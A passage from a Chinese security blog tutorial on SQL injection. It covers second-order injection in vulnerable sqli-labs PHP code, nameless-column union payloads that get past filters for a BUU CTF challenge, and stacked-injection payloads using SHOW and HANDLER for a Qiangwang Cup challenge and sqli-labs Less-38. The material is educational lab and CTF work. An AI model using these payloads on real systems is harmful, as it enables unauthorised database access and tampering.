<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//转义</span><br><span class="line">function sqllogin($con1)&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line">   $password = mysqli_real_escape_string($con1, $_POST[&quot;login_password&quot;]);</span><br><span class="line">   $sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">   //$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">   $res = mysqli_query($con1, $sql) or die(&#x27;You tried to be real smart, Try harder!!!! :( &#x27;);</span><br><span class="line">   $row = mysqli_fetch_row($res);</span><br><span class="line">	 //print_r($row) ;</span><br><span class="line">   if ($row[1]) &#123;</span><br><span class="line">	    return $row[1];</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">	    return 0;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>注册界面：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694949969_6506e25189686b0a33b02.jpeg"
                      alt="图片.png"
                ><br>注册代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#x27;submit&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">	# Validating the user input........</span><br><span class="line"></span><br><span class="line">	//$username=  $_POST[&#x27;username&#x27;] ;</span><br><span class="line">	$username=  mysqli_real_escape_string($con1, $_POST[&#x27;username&#x27;]) ;</span><br><span class="line">	$pass= mysqli_real_escape_string($con1, $_POST[&#x27;password&#x27;]);</span><br><span class="line">	$re_pass= mysqli_real_escape_string($con1, $_POST[&#x27;re_password&#x27;]);</span><br><span class="line"></span><br><span class="line">	echo &quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;;</span><br><span class="line">	$sql = &quot;select count(*) from users where username=&#x27;$username&#x27;&quot;;</span><br><span class="line">	$res = mysqli_query($con1, $sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);</span><br><span class="line">	$row = mysqli_fetch_row($res);</span><br><span class="line"></span><br><span class="line">	//print_r($row);</span><br><span class="line">	if (!$row[0]==0) </span><br><span class="line">	&#123;</span><br><span class="line">		?&gt;</span><br><span class="line">		&lt;script&gt;alert(&quot;The username Already exists, Please choose a different username &quot;)&lt;/script&gt;;</span><br><span class="line">		&lt;?php</span><br><span class="line">		header(&#x27;refresh:1, url=new_user.php&#x27;);</span><br><span class="line">	&#125; </span><br><span class="line">	else </span><br><span class="line">	&#123;</span><br><span class="line">		if ($pass==$re_pass)</span><br><span class="line">		&#123;</span><br><span class="line">			# Building up the query........</span><br><span class="line"></span><br><span class="line">			$sql = &quot;insert into users (username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;</span><br><span class="line">			mysqli_query($con1, $sql) or die(&#x27;Error Creating your user account,  : &#x27;.mysqli_error($con1));</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;center&gt;&lt;img src=../images/Less-24-user-created.jpg&gt;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;;   				</span><br><span class="line">			//echo &quot;&lt;h1&gt;User Created Successfully&lt;/h1&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;					</span><br><span class="line">			echo &quot;&lt;/br&gt;Redirecting you to login page in 5 sec................&quot;;</span><br><span class="line">			echo &quot;&lt;font size=&#x27;2&#x27;&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;If it does not redirect, click the home button on top right&lt;/center&gt;&quot;;</span><br><span class="line">			header(&#x27;refresh:5, url=index.php&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			?&gt;</span><br><span class="line">			&lt;script&gt;alert(&#x27;Please make sure that password field and retype password match correctly&#x27;)&lt;/script&gt;</span><br><span class="line">			&lt;?php</span><br><span class="line">			header(&#x27;refresh:1, url=new_user.php&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>利用流程：</p>
<ol>
<li>利用注册，将<code>admin&#39;#</code>插入数据库。</li>
<li>以<code>admin&#39;#</code>登录，执行<code>sql = &quot;SELECT * FROM users WHERE username=&#39;admin &#39;#&#39; and password=&#39;$password&#39;&quot;;</code>并可修改<code>admin</code>密码。</li>
</ol>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694950421_6506e415ac6b7d4482328.jpeg"
                      alt="图片.png"
                ></p>
<h2 id="无名列注入"><a href="#无名列注入" class="headerlink" title="无名列注入"></a>无名列注入</h2><ul>
<li>无名列注入就是在不知道列名的情况下进行 sql 注入。通常我们用于获取所有库的库名，表名，列名的 infomation_scema 库经常被 WAF 过滤。无名列注入适用于已经获取数据表但无法查询列的情况。</li>
<li>原理：类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询。<br>正常查询<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194369_650a9d01e1b1809cd83e1.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194467_650a9d636c71cc4a210d1.jpeg"
                      alt="图片.png"
                ><br>union 查询<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194533_650a9da57fb6fe93ed0be.jpeg"
                      alt="图片.png"
                ><br>利用数字<strong>3</strong>代替未知列名需要加上反引号`3`。后面的<strong>a</strong>表示上图中表的别名。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194729_650a9e695aa1c4a0aa786.jpeg"
                      alt="图片.png"
                ><br>若反引号被过滤掉，可用别名代替。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194788_650a9ea40e73244560dcc.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<p>BUU例题：[SWPU2019]Web1<br>注册后经测试，过滤了<code>or</code>,<code>#</code>,<code>--``+</code>和。<br>爆破库名：<br><code>1&#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195496_650aa168b53c1e2368e8a.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195565_650aa1ad8375a774ee6b2.jpeg"
                      alt="图片.png"
                ><br>爆破表名：<br><code>1&#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#39;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195692_650aa22c6adc022c33f16.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195703_650aa2372de91d8573484.jpeg"
                      alt="图片.png"
                ><br>无名列注入：<br><code>1&#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195756_650aa26c9b351d824deca.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195774_650aa27eb18737321a5e2.jpeg"
                      alt="图片.png"
                ></p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><ul>
<li><p>堆叠注入就是一堆 SQL 语句一起执行。我们将多个 SQL 语句用 “;” 连接起来即可达到多条语句一起执行的效果。堆叠注入和 union 联合查询本质上都是将两条语句一起执行，但 union 查询只能连接两条查询语句，而堆叠注入可连接两条任意语句。当 WAF 没有过滤 show, rename, alert 等关键字时，可考虑堆叠注入。</p>
</li>
<li><p>例题：[强网杯 2019]随便注<br>输入<code>1&#39;;show databases;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695196469_650aa53546795787c1a58.jpeg"
                      alt="图片.png"
                ><br>输入<code>1&#39;;show tables #</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695196646_650aa5e6393bc79d49753.jpeg"
                      alt="图片.png"
                ><br>输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `words`#</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695197104_650aa7b0dad99a854f5e6.jpeg"
                      alt="图片.png"
                ><br>输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `1919810931114514` #</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695196862_650aa6be9da5679bce968.jpeg"
                      alt="图片.png"
                ><br>输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read first limit 0,2;#</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695197353_650aa8a950d9623b3e907.jpeg"
                      alt="图片.png"
                ></p>
</li>
<li><p><a class="link"   href="https://blog.csdn.net/rainsghost/article/details/127246004" >Tips <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><code>hand tablename open as new_tablename;</code>。追加tablename的表的别名为new_tablename（需要注意的是，此处不是修改，且只在当前会话内生效）<br><code>Handler_read_next;</code>此选项表明在进行索引扫描时，按照索引从数据文件里取数据的次数。</p>
</li>
</ul>
<p>例题：sqli-labs:Less-38</p>
<p><strong><a class="link"   href="http://127.0.0.1/sqli-labs/Less-38/?id=1" >http://127.0.0.1/sqli-labs/Less-38/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695197917_650aaadd41a5591833127.jpeg"
                      alt="图片.png"
                ><br>payload:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/sqli-labs/Less-38/?id=1&#x27;;insert into users(id,username,password) values(21,&#x27;5555&#x27;,&#x27;5555&#x27;); #</span><br></pre></td></tr></table></figure></div>



<h2 id="SQL-注入与其他漏洞结合"><a href="#SQL-注入与其他漏洞结合" class="headerlink" title="SQL 注入与其他漏洞结合"></a>SQL 注入与其他漏洞结合</h2><p>后续补充。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>SQL injection</tag>
      </tags>
  </entry>
</search>
